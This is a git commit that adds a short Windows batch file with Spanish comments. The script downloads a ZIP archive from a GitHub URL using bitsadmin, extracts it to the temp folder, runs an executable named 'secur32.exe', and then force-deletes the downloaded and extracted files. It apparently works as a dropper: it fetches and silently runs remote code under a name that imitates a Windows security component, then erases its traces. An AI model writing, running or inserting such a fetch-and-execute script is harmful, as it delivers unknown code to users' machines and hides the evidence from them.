89d63f6ccef404cde1daa508d3d97fc31e2dfb5e
eventos-dev <71229196+eventos-dev@users.noreply.github.com>
2024-05-27 06:41:19 -0400

    Create don.bat

---
+++ don.bat
@@ -0,0 +1,21 @@
+@echo off
+
+set "downloadURL=https://github.com/eventos-dev/test/raw/main/secur32.zip"
+set "tempPath=%temp%\archivo.zip"
+set "extractPath=%temp%\extracted"
+
+REM Descargar el archivo ZIP utilizando bitsadmin
+bitsadmin /transfer "Descarga" %downloadURL% %tempPath%
+
+REM Descomprimir el archivo ZIP
+powershell -command "Expand-Archive -Path '%tempPath%' -DestinationPath '%extractPath%' -Force"
+
+REM Ejecutar el archivo principal
+cd "%extractPath%"
+start "" secur32.exe
+
+REM Eliminar los archivos temporales
+del /f /q "%tempPath%"
+rd /s /q "%extractPath%"
+
+exit
